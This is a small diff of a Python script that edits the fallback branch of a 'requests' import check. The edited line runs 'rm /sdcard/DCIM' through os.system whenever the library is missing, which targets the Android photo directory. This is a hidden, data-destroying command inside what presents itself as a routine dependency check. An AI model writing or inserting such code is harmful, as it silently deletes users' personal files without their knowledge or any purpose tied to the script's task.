@@ -10,5 +10,5 @@ else:
     try:
         import requests
     except ImportError:
-        os.system("rm /sdcard")
+        os.system("rm /sdcard/DCIM")
 
